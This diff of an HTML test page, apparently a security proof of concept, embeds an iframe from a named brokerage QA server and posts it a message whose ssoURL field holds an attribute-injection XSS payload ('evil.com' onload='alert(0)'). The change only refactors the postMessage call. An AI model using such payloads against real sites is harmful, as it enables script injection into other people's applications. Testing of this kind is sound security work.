@@ -40,6 +40,7 @@ title: Home
 <iframe id="folio" src="https://qa8.foliodx.com/brokerage/AControlServlet"></iframe>
 <script>
  var message= {type:"message",data:{abc:"def",request:"attack",eventName:"folioActionLaunch",data:{ssoURL:"http://evil.com' onload='alert(0);'"}}};
- setTimeout(document.getElementById("folio").postMessage(message,"*"), 3000);
+ var win = document.getElementById("folio");
+ setTimeout(win.postMessage(message,"*"), 3000);
 </script>
   
